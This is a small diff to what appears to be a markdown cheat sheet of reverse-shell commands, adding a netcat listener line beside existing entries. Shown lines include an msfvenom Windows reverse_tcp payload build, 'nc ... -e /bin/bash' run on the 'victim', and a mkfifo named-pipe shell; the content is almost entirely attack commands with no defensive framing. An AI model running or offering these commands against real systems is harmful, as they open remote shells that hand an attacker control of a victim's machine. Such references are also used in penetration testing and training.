@@ -40,6 +40,10 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 
 ### Sender (Victim)
 
+reverse-shell listner (server)
+
+    nc –lvp 4444
+
 Simple reverse shell
 ```
 nc <LOCAL-IP> <PORT> -e /bin/bash
@@ -86,6 +90,8 @@ Create a reverseshell listner with namned pipe
 ```
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
+
+
 
 
 ## Windows
